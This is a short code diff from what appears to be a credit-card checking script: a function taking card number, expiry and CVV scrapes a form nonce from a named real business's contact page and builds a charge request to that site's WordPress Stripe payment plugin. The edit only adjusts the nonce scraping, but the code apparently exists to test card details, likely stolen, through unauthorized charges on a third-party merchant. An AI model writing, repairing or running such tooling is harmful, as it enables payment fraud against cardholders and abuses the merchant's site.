@@ -89,8 +89,8 @@ def chk(CCN, MM, YY, CVV):
     COU = token.json()["card"]["country"]
     time.sleep(1)
 
-    nonce = s.get("https://www.cpadventure.ie/pages/contact-2/").text
-    form = re.findall(r'formNonce" value="[\'"]?([^\'" >]+)', nonce)
+    nonce = s.get("https://www.cpadventure.ie/pages/contact-2/", headers=HEADER )
+    form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)
 
     load = {
         "action": "wp_full_stripe_payment_charge",
